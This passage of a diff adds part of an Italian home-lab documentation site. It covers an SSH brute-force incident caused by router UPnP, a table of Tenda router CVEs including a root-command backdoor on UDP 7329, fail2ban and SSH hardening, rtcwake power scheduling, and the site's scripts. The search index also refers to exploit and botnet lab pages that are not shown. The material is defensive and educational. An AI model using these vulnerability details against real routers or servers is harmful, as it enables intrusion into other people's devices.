+<span class="sh-cmd">journalctl</span> _SYSTEMD_UNIT=ssh.service <span class="sh-flag">--since</span> <span class="sh-str">"7 days ago"</span> | <span class="sh-cmd">grep</span> <span class="sh-str">"Accepted"</span>
+<span class="sh-cmt"># Risultato: tutti i login accettati da IP interni (LAN e VPN). Nessun accesso esterno.</span></pre>
+      </div>
+
+      <h3>Timeline attacco</h3>
+      <div class="timeline">
+        <div class="tl-item"><div class="tl-dot info"></div><div><div class="tl-time">Mar 23 &mdash; 16:05:06</div><div class="tl-desc">Port scan &mdash; connessione chiusa subito</div></div></div>
+        <div class="tl-item"><div class="tl-dot err"></div><div><div class="tl-time">Mar 23 &mdash; 16:07:29</div><div class="tl-desc">Tentativo username <code>sol</code> &mdash; fallito (utente inesistente)</div></div></div>
+        <div class="tl-item"><div class="tl-dot err"></div><div><div class="tl-time">Mar 23 &mdash; 16:09:48</div><div class="tl-desc">Tentativo username <code>solana</code> &mdash; fallito</div></div></div>
+        <div class="tl-item"><div class="tl-dot err"></div><div><div class="tl-time">Mar 23 &mdash; 16:11:58</div><div class="tl-desc">Tentativo username <code>solv</code> &mdash; fallito</div></div></div>
+        <div class="tl-item"><div class="tl-dot"></div><div><div class="tl-time">Totale: ~7 minuti</div><div class="tl-desc">Bot automatico specializzato in username crypto Solana. Obiettivo: rubare chiavi private, installare miner, usare il server come relay.</div></div></div>
+      </div>
+
+      <h3>Come il bot ha raggiunto la porta 22</h3>
+      <p>La porta 22 non era configurata nel port forwarding. Causa: <strong>UPnP attivo sul router Tenda</strong>. Il router ha aperto automaticamente la porta quando Proxmox ha avviato <code>ssh.service</code>, senza intervento dell'utente.</p>
+      <div class="pre-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">&#128203; copia</button>
+        <pre>Proxmox avvia ssh.service
+    |
+    v richiesta UPnP automatica
+Router Tenda (UPnP attivo)
+    |  apre porta 22 esterna -> server:22
+    v
+Internet - bot scansionano tutti i 4 miliardi di IP
+    |
+    v
+Bot trova porta 22 aperta -> lancia brute force</pre>
+      </div>
+
+      <h3>CVE rilevanti router Tenda</h3>
+      <div class="table-wrap">
+        <table>
+          <tr><th>CVE</th><th>CVSS</th><th>Tipo</th></tr>
+          <tr><td><code>CVE-2022-42053</code></td><td>7.8</td><td>RCE via UPnP &mdash; command injection tramite <code>portMappingServer</code></td></tr>
+          <tr><td><code>CVE-2022-40845</code></td><td>8.8</td><td>Endpoint non autenticato espone config + PSK WPA in chiaro</td></tr>
+          <tr><td><code>CVE-2022-40843</code></td><td>9.9</td><td>Hash MD5 password admin accessibile senza auth via syslog</td></tr>
+          <tr><td><code>CVE-2023-2649</code></td><td>8.8</td><td>RCE via UDP 7329 &mdash; pattern backdoor presente anche in modelli recenti</td></tr>
+          <tr><td><code>CVE-2020-12695</code></td><td>&mdash;</td><td>UPnP CallStranger &mdash; SSRF e data exfiltration attraverso firewall</td></tr>
+        </table>
+      </div>
+
+      <div class="alert alert-err">
+        <span class="alert-icon">&#9888;</span>
+        <span>Backdoor firmware 2013: la funzione <code>MfgThread()</code> espone UDP 7329 che esegue comandi root da chiunque sia in LAN. Tenda storicamente non risponde ai ricercatori di sicurezza: le CVE rimangono non patchate indefinitamente.</span>
+      </div>
+
+      <h3>Hardening eseguito</h3>
+      <div class="table-wrap">
+        <table>
+          <tr><th>Impostazione</th><th>Prima</th><th>Dopo</th></tr>
+          <tr><td>PasswordAuthentication</td><td>yes (default)</td><td><code>no</code></td></tr>
+          <tr><td>PermitRootLogin</td><td>yes</td><td><code>prohibit-password</code></td></tr>
+          <tr><td>fail2ban</td><td>non funzionante (journald vs file)</td><td>attivo (backend systemd)</td></tr>
+          <tr><td>Login method</td><td>Password</td><td>Solo chiave ED25519</td></tr>
+        </table>
+      </div>
+
+      <div class="pre-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">&#128203; copia</button>
+        <pre><span class="sh-cmt"># /etc/fail2ban/jail.local - fix per Proxmox con journald</span>
+[sshd]
+<span class="sh-cmd">enabled</span>      = true
+<span class="sh-cmd">backend</span>      = systemd
+<span class="sh-cmd">journalmatch</span> = _SYSTEMD_UNIT=ssh.service
+<span class="sh-cmd">maxretry</span>     = <span class="sh-val">5</span>
+<span class="sh-cmd">findtime</span>     = <span class="sh-val">10m</span>
+<span class="sh-cmd">bantime</span>      = <span class="sh-val">1h</span></pre>
+      </div>
+
+      <h3>Lezioni apprese</h3>
+      <ul class="checklist">
+        <li class="done"><span class="ck">✓</span> Il monitoring attivo ha rilevato l'attacco: senza lo script non lo avremmo saputo</li>
+        <li class="done"><span class="ck">✓</span> Un server su internet viene trovato dai bot in ore (scansionano tutti i 4 miliardi di IP in rotazione continua)</li>
+        <li class="done"><span class="ck">✓</span> fail2ban installato ma non configurato = falsa sicurezza</li>
+        <li class="done"><span class="ck">✓</span> UPnP attivo = port forwarding automatico non controllato, equivale ad avere porte aperte senza saperlo</li>
+        <li class="done"><span class="ck">✓</span> WPA con password non protegge da vulnerabilita' del router (CVE-2022-40845 espone la PSK WPA in chiaro)</li>
+        <li class="done"><span class="ck">✓</span> Limitare SSH a <code>wg0</code> only senza console seriale crea rischio lockout totale</li>
+      </ul>
+
+      <hr />
+
+      <h2>&#128203; Security Audit &mdash; 2026-04-06</h2>
+      <div class="alert alert-info">
+        <span class="alert-icon">&#128269;</span>
+        <span>Audit generale dell'infrastruttura: porte esposte, hardening SSH, fail2ban, stato VPN, esposizione internet.</span>
+      </div>
+      <ul class="checklist">
+        <li class="done"><span class="ck">✓</span> SSH key-only su Proxmox e cs42</li>
+        <li class="done"><span class="ck">✓</span> fail2ban backend systemd su Proxmox</li>
+        <li class="done"><span class="ck">✓</span> fail2ban ignoreip LAN+VPN su narutoPi (maxretry=3, bantime=24h)</li>
+        <li class="done"><span class="ck">✓</span> Pi-hole ACL: solo LAN, webserver bindato su IP interno</li>
+        <li class="done"><span class="ck">✓</span> pve-firewall policy IN: DROP</li>
+        <li class="todo"><span class="ck">○</span> Porta 53 pubblica: open resolver, rischio DDoS amplification</li>
+        <li class="todo"><span class="ck">○</span> UPnP router: da disabilitare nel pannello admin</li>
+        <li class="todo"><span class="ck">○</span> AnyDesk porta 7070 su Mac principale: da disabilitare se non usato</li>
+        <li class="todo"><span class="ck">○</span> Firmware router Vodafone: verificare CVE-2022-40843 / CVE-2022-40845</li>
+        <li class="todo"><span class="ck">○</span> Confermare/migrare DDNS da No-IP a DuckDNS</li>
+      </ul>
+    </section>
+
+    <!-- ======= REMOTE POWER ======= -->
+    <section class="page" id="power">
+      <h1>Remote Power Management</h1>
+      <p class="subtitle">Server a Milano gestito da remoto (es. Praga) tramite timer RTC hardware.</p>
+
+      <div class="alert alert-info">
+        <span class="alert-icon">&#9889;</span>
+        <span>Il server non e' sempre acceso. La gestione remota avviene tramite <code>rtcwake</code>, che usa il Real Time Clock hardware della scheda madre per programmare il wake &mdash; senza bisogno di Wake-on-LAN o intervento fisico.</span>
+      </div>
+
+      <h2>&#128256; Come funziona rtcwake</h2>
+      <p><code>rtcwake</code> imposta un timer sull'RTC (chip orologio hardware integrato in ogni scheda madre) che rimane attivo anche quando il PC e' spento. Alla scadenza, il chip invia un segnale di wake che accende il sistema automaticamente.</p>
+
+      <div class="pre-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">&#128203; copia</button>
+        <pre><span class="sh-cmt"># Spegni e riaccenditi tra N secondi (off = spegnimento completo ACPI S5)</span>
+<span class="sh-cmd">rtcwake</span> <span class="sh-flag">-m</span> off <span class="sh-flag">-s</span> <span class="sh-val">&lt;secondi&gt;</span>
+
+<span class="sh-cmt"># Esempi pratici</span>
+<span class="sh-cmd">rtcwake</span> <span class="sh-flag">-m</span> off <span class="sh-flag">-s</span> <span class="sh-val">3600</span>    <span class="sh-cmt"># riaccendi tra 1 ora</span>
+<span class="sh-cmd">rtcwake</span> <span class="sh-flag">-m</span> off <span class="sh-flag">-s</span> <span class="sh-val">28800</span>   <span class="sh-cmt"># riaccendi tra 8 ore</span>
+
+<span class="sh-cmt"># Riaccendi a un'ora precisa (domani alle 09:00)</span>
+<span class="sh-cmd">rtcwake</span> <span class="sh-flag">-m</span> off <span class="sh-flag">-t</span> $(date +%s <span class="sh-flag">-d</span> <span class="sh-str">"tomorrow 09:00"</span>)
+
+<span class="sh-cmt"># Verifica l'orario RTC impostato</span>
+<span class="sh-cmd">cat</span> /sys/class/rtc/rtc0/wakealarm</pre>
+      </div>
+
+      <h2>&#128336; Flusso operativo</h2>
+      <div class="timeline">
+        <div class="tl-item"><div class="tl-dot"></div><div><div class="tl-time">Da remoto (Praga / qualsiasi posto)</div><div class="tl-desc">Accesso al server via WireGuard VPN + DDNS. Pianificazione della sessione di lavoro.</div></div></div>
+        <div class="tl-item"><div class="tl-dot"></div><div><div class="tl-time">Fine sessione</div><div class="tl-desc">Eseguo <code>rtcwake -m off -s &lt;secondi&gt;</code> per programmare la prossima accensione, poi il server si spegne.</div></div></div>
+        <div class="tl-item"><div class="tl-dot"></div><div><div class="tl-time">Orario programmato</div><div class="tl-desc">Il chip RTC hardware accende il server. Proxmox si avvia, i servizi partono automaticamente.</div></div></div>
+        <div class="tl-item"><div class="tl-dot"></div><div><div class="tl-time">Sessione disponibile</div><div class="tl-desc">Accesso via SSH su WireGuard VPN. La finestra di lavoro e' pronta.</div></div></div>
+      </div>
+
+      <h2>&#9989; Vantaggi</h2>
+      <div class="card-grid">
+        <div class="card"><div class="card-title">Nessun hardware aggiuntivo</div><div class="card-body">Non serve smart plug, Wake-on-LAN configurato, o qualcuno fisicamente presente. L'RTC e' integrato in ogni scheda madre.</div></div>
+        <div class="card"><div class="card-title">Risparmio energetico</div><div class="card-body">Il server e' acceso solo quando serve. Riduce consumo energetico e usura dell'hardware rispetto a lasciarlo sempre on.</div></div>
+        <div class="card"><div class="card-title">Gestione da qualsiasi posto</div><div class="card-body">Da Praga, in treno, da qualsiasi dispositivo con WireGuard configurato. Basta un client VPN attivo.</div></div>
+      </div>
+
+      <h2>&#128680; Incidente rtcwake &mdash; 2026-03-28</h2>
+      <div class="alert alert-warn">
+        <span class="alert-icon">&#9888;</span>
+        <span>Il server non si e' riacceso all'orario programmato. Causa investigata: problema di connettivita' VPN durante il riavvio che ha impedito l'accesso alla sessione pianificata.</span>
+      </div>
+      <p>Lezione appresa: verificare sempre che WireGuard sia abilitato all'avvio automatico prima di programmare sessioni rtcwake critiche.</p>
+      <div class="pre-wrap">
+        <button class="copy-btn" onclick="copyCode(this)">&#128203; copia</button>
+        <pre><span class="sh-cmt"># Assicurarsi che WireGuard parta al boot</span>
+<span class="sh-cmd">systemctl</span> enable wg-quick@wg0
+
+<span class="sh-cmt"># Con PiVPN</span>
+<span class="sh-cmd">systemctl</span> enable wg-quick@pivpn0
+
+<span class="sh-cmt"># Verifica stato</span>
+<span class="sh-cmd">systemctl</span> is-enabled wg-quick@wg0</pre>
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<!-- BACK TO TOP -->
+<button id="btt" onclick="scrollTop()" title="Torna in cima">&#8679;</button>
+
+<script>
+// ===== NAVIGATION =====
+let gKey = null;
+
+function show(pageId) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('nav a').forEach(a => a.classList.remove('active'));
+  document.getElementById('search-results').classList.remove('active');
+
+  const page = document.getElementById(pageId);
+  if (page) page.classList.add('active');
+
+  const link = document.querySelector(`nav a[data-page="${pageId}"]`);
+  if (link) link.classList.add('active');
+
+  document.getElementById('main-content').scrollTop = 0;
+  closeMobileNav();
+}
+
+// ===== MOBILE NAV =====
+function toggleMobileNav() {
+  const nav = document.getElementById('sidebar');
+  const btn = document.getElementById('hamburger');
+  const ov  = document.getElementById('overlay');
+  const open = nav.classList.toggle('open');
+  btn.classList.toggle('open', open);
+  ov.style.display = open ? 'block' : 'none';
+}
+
+function closeMobileNav() {
+  document.getElementById('sidebar').classList.remove('open');
+  document.getElementById('hamburger').classList.remove('open');
+  document.getElementById('overlay').style.display = 'none';
+}
+
+// ===== SEARCH =====
+const searchIndex = [
+  { page: 'home',       title: 'Home', content: 'dimaNet home lab proxmox VE virtualizzazione pentesting sicurezza wireguard wazuh pi-hole' },
+  { page: 'infra',      title: 'Infrastruttura', content: 'topologia rete LAN VPN macchine VM container LXC kali ubuntu debian arch esposizione internet porte' },
+  { page: 'roadmap',    title: 'Roadmap', content: 'web server database file server docker cloud MAAS juju DNS DHCP mail postfix IDS monitoring CI/CD nextcloud backup ansible VPN IoT MQTT' },
+  { page: 'poc',        title: 'PoC Lab', content: 'proof of concept CVE exploit hack ricerca sicurezza home lab isolato' },
+  { page: 'cve-regres', title: 'CVE-2024-6387 regreSSHion', content: 'regresshion openssh race condition RCE root SIGALRM malloc heap grooming fake FILE struct ASLR shellcode msfvenom paramiko glibc offset login grace time signal handler' },
+  { page: 'botnet',     title: 'Botnet Lab', content: 'botnet C2 command control agent python propagazione detection wazuh suricata LAN isolata' },
+  { page: 'soc',        title: 'SOC / SIEM', content: 'SOC SIEM wazuh manager dashboard indexer agent kali attacker brute force hydra nmap suricata IDS alert log' },
+  { page: 'vpn',        title: 'VPN Setup', content: 'wireguard pivpn no-ip DDNS split tunnel full tunnel chiavi pubblica privata preshared port forwarding NAT UDP 51820' },
+  { page: 'incidents',  title: 'Incidenti', content: 'SSH brute force attacco bot solana crypto fail2ban UPnP tenda CVE router hardening ED25519 chiave audit' },
+  { page: 'power',      title: 'Remote Power', content: 'rtcwake RTC hardware accensione remota programmata timer spegnimento Milano Praga VPN WireGuard boot automatico' },
+];
+
+const searchInput = document.getElementById('search');
+const searchResults = document.getElementById('search-results');
+
+searchInput.addEventListener('input', function() {
+  const q = this.value.trim().toLowerCase();
+  if (!q) {
+    searchResults.classList.remove('active');
+    const active = document.querySelector('nav a.active');
+    if (active) show(active.dataset.page);
+    return;
+  }
+
+  const results = searchIndex.filter(item =>
+    item.title.toLowerCase().includes(q) ||
+    item.content.toLowerCase().includes(q)
+  );
+
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  searchResults.classList.add('active');
+
+  if (results.length === 0) {
+    searchResults.innerHTML = `<p style="color:var(--text-dim);font-size:.875rem;padding:1rem 0">Nessun risultato per "<strong>${q}</strong>"</p>`;
+    return;
+  }
+
+  searchResults.innerHTML = `<h2 style="margin-top:0">Risultati per "${q}"</h2>` +
+    results.map(r => {
+      const words = q.split(/\s+/);
+      const reg = new RegExp(`(${words.join('|')})`, 'gi');
+      const excerpt = r.content.replace(reg, '<mark>$1</mark>').slice(0, 120) + '...';
+      return `<div class="sr-item" onclick="show('${r.page}');searchInput.value=''">
+        <div class="sr-page">${r.page}</div>
+        <div class="sr-title">${r.title.replace(reg, '<mark>$1</mark>')}</div>
+        <div class="sr-excerpt">${excerpt}</div>
+      </div>`;
+    }).join('');
+});
+
+// ===== COPY CODE =====
+function copyCode(btn) {
+  const pre = btn.nextElementSibling;
+  const text = pre.innerText;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.classList.add('copied');
+    btn.innerHTML = '&#10003; copiato';
+    showToast('Copiato negli appunti');
+    setTimeout(() => {
+      btn.classList.remove('copied');
+      btn.innerHTML = '&#128203; copia';
+    }, 2000);
+  });
+}
+
+// ===== TOAST =====
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2000);
+}
+
+// ===== SCROLL SECTION =====
+function scrollH(id) {
+  const el = document.getElementById(id);
+  if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+}
+
+// ===== BACK TO TOP =====
+function scrollTop() {
+  document.getElementById('main-content').scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+document.getElementById('main-content').addEventListener('scroll', function() {
+  const btt = document.getElementById('btt');
+  btt.classList.toggle('visible', this.scrollTop > 300);
+
+  // Progress bar
+  const progress = document.getElementById('progress');
+  const pct = (this.scrollTop / (this.scrollHeight - this.clientHeight)) * 100;
+  progress.style.width = pct + '%';
+});
+
+// ===== KEYBOARD SHORTCUTS =====
+document.addEventListener('keydown', function(e) {
+  const tag = document.activeElement.tagName;
+  const typing = tag === 'INPUT' || tag === 'TEXTAREA';
+
+  if (e.key === 'Escape') {
+    document.getElementById('shortcut-modal').classList.remove('open');
+    if (typing) document.activeElement.blur();
+    gKey = null;
+    return;
+  }
+
+  if (e.key === '/' && !typing) {
+    e.preventDefault();
+    searchInput.focus();
+    return;
+  }
+
+  if (e.key === '?' && !typing) {
+    document.getElementById('shortcut-modal').classList.add('open');
+    return;
+  }
+
+  // Two-key shortcuts: g+h, g+p, g+i
+  if (!typing) {
+    if (e.key === 'g') { gKey = 'g'; return; }
+    if (gKey === 'g') {
+      if (e.key === 'h') show('home');
+      if (e.key === 'p') show('poc');
+      if (e.key === 'i') show('incidents');
+      if (e.key === 'v') show('vpn');
+      if (e.key === 's') show('soc');
+      gKey = null;
+    }
+  }
+});
+
+// ===== ANIMATED COUNTERS =====
+function animateCounters() {
+  document.querySelectorAll('.counter').forEach(el => {
+    const target = parseInt(el.dataset.target, 10);
+    let current = 0;
+    const step = Math.max(1, Math.floor(target / 20));
+    const timer = setInterval(() => {
+      current = Math.min(current + step, target);
+      el.textContent = current;
+      if (current >= target) clearInterval(timer);
+    }, 40);
+  });
+}
+
+// Run counters when their page is visible
+const counterObserver = new IntersectionObserver((entries) => {
+  entries.forEach(e => {
+    if (e.isIntersecting && e.target.classList.contains('counter') && !e.target.dataset.done) {
+      e.target.dataset.done = '1';
+      const target = parseInt(e.target.dataset.target, 10);
+      let current = 0;
+      const step = Math.max(1, Math.floor(target / 20));
+      const timer = setInterval(() => {
+        current = Math.min(current + step, target);
+        e.target.textContent = current;
+        if (current >= target) clearInterval(timer);
+      }, 40);
+    }
+  });
+}, { threshold: 0.1 });
+
+document.querySelectorAll('.counter').forEach(el => counterObserver.observe(el));
+</script>
+
+</body>
+</html>
